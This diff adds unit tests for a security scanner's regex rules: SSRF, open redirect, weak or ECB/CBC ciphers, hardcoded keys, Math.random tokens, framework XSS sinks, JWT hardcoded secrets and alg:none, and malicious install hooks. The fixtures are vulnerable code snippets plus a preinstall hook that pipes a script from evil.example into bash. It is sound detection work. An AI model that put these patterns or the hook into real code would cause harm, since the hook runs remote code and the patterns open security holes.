@@ -229,3 +229,74 @@ describe('真实性基准（v0.5.0）', () => {
     assert.equal(json.metric.FN, 0, `漏报应为 0，实际 ${json.metric.FN}`);
   });
 });
+
+describe('v0.6.0 新增真实模式规则', () => {
+  const find = (id) => RULES.find((r) => r.id === id);
+
+  test('SSRF：请求函数用用户可控 URL 命中（变量/req/template URL），相对路径不误报', () => {
+    const r = find('INJ-SSRF');
+    assert.ok(r);
+    assert.equal(r.regex.test('axios.get(userUrl)'), true, 'userUrl 变量');
+    assert.equal(r.regex.test('const data = await fetch(target);'), true, 'target 变量');
+    assert.equal(r.regex.test('fetch(req.query.url)'), true, 'req.query.url');
+    assert.equal(r.regex.test('fetch(`/api/users/${encodeURIComponent(id)}`)'), false, '相对路径模板不误报');
+    assert.equal(r.regex.test("fetch('http://internal.metrics.local/v1/data')"), false, '固定内网地址不误报');
+  });
+
+  test('开放重定向：res.redirect 用户可控命中，固定路径不误报', () => {
+    const r = find('INJ-REDIRECT');
+    assert.ok(r);
+    assert.equal(r.regex.test('res.redirect(url)'), true, 'url 变量');
+    assert.equal(r.regex.test('res.redirect(`/home?token=${req.body.redirect}`)'), true, '模板插值');
+    assert.equal(r.regex.test("res.redirect('/dashboard')"), false, '固定路径不误报');
+    assert.equal(r.regex.test("res.redirect('/login')"), false, '固定路径不误报');
+  });
+
+  test('CRYPTO-WEAK-CIPHER 扩展覆盖 AES-ECB / AES-CBC，排除 GCM', () => {
+    const r = find('CRYPTO-WEAK-CIPHER');
+    assert.equal(r.regex.test("createCipheriv('aes-128-ecb', key, null)"), true, 'ECB 应命中');
+    assert.equal(r.regex.test("createCipheriv('aes-256-cbc', key, prevIv)"), true, 'CBC 应命中');
+    assert.equal(r.regex.test("createCipheriv('aes-256-gcm', key, iv)"), false, 'GCM 安全不命中');
+    assert.equal(r.regex.test("createCipheriv('des-cbc', key, iv)"), true, 'des-cbc 应命中');
+  });
+
+  test('CRYPTO-HARDCODED-IV：Buffer.from 字面量用作加密材料', () => {
+    const r = find('CRYPTO-HARDCODED-IV');
+    assert.equal(r.regex.test("const KEY = Buffer.from('k3y_m4st3r_s3cr3t_harden1ng2028', 'utf8');\n  const c = crypto.createCipheriv('aes-256-cbc', KEY, iv);"), true, 'KEY 字面量命中');
+    assert.equal(r.regex.test("const iv = crypto.randomBytes(16);\n createCipheriv('aes-256-gcm', key, iv)"), false, 'randomBytes 不命中');
+  });
+
+  test('CRYPTO-WEAK-RANDOM：Math.random 生成 token 命中，UI 随机数和 randomBytes 不误报', () => {
+    const r = find('CRYPTO-WEAK-RANDOM');
+    assert.equal(r.regex.test('const token = Math.random().toString(36).slice(2)'), true, 'token 用 Math.random');
+    assert.equal(r.regex.test('return Math.random().toString(36) + Math.random().toString(36)'), true, 'toString(36) 命中');
+    assert.equal(r.regex.test('const rand = Math.random()'), false, '普通 Math.random 不误报');
+    assert.equal(r.regex.test('vol = Math.random() * 100'), false, 'UI 数学计算不误报');
+    assert.equal(r.regex.test("return randomBytes(32).toString('hex')"), false, 'randomBytes 不误报');
+  });
+
+  test('jQuery / Vue / React XSS 均有对应规则', () => {
+    const jq = find('XSS-JQUERY-HTML');
+    assert.equal(jq.regex.test("$('#list').html(comment.body)"), true, '.html(变量)');
+    assert.equal(jq.regex.test("$('#x').text(comment.body)"), false, '.text() 安全');
+    const vue = find('XSS-VUE-VHTML');
+    assert.equal(vue.regex.test('<div v-html="author.bio"></div>'), true, 'v-html 命中');
+    assert.equal(vue.regex.test('<p v-text="author.name"></p>'), false, 'v-text 安全');
+    const react = find('XSS-REACT-DANGEROUS');
+    assert.equal(react.regex.test('dangerouslySetInnerHTML={{ __html: renderMarkdown(body) }}'), true, 'React 命中');
+    assert.equal(react.regex.test('<div>{text}</div>'), false, 'React 默认转义不误报');
+  });
+
+  test('JWT 硬编码 secret 与 alg:none 命中，env 变量不误报', () => {
+    const r = find('JWT-HARDCODED-SECRET');
+    assert.equal(r.regex.test("jwt.sign({ sub: user.id }, 'shh_do_not_leak', { expiresIn: '1d' })"), true, '硬编码 secret');
+    assert.equal(r.regex.test("jwt.verify(token, null, { algorithms: ['none'] })"), true, 'alg:none');
+    assert.equal(r.regex.test("jwt.sign({ sub: user.id }, process.env.JWT_SECRET, { expiresIn: '1d' })"), false, 'env 变量不误报');
+  });
+
+  test('供应链接钩子脚本检测', () => {
+    const r = find('DEPS-UNTRUSTED-SCRIPT');
+    assert.equal(r.regex.test('"preinstall": "curl -s https://evil.example/x.sh | bash"'), true, 'preinstall curl|bash');
+    assert.equal(r.regex.test('"start": "node server.js"'), false, '普通脚本不误报');
+  });
+});
